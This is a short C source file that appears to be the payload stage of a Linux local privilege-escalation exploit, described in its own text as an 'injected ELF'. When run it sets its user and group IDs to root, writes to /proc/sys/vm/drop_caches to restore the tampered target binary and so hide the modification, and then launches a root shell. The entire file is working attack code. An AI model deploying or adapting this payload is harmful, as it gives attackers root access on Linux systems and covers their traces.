#define SYS_ERRNO ((int){0}) // dummy lvalue
#include "linux_syscall_support.h"

static const char hello[] = "[+] Hello from injected ELF\n";

// drop the caches first, thus restoring the target binary to its original state
static const char *sh_argv[] = {"/bin/sh", "-c", "echo 1 > /proc/sys/vm/drop_caches; sh", NULL};

void _start(void)
{
	sys_write(1, hello, sizeof(hello)-1);

	// TODO: check we're actually root, check setr* results
	sys_setresuid(0, 0, 0);
	sys_setresgid(0, 0, 0);

	sys_execve(sh_argv[0], sh_argv, NULL);
}
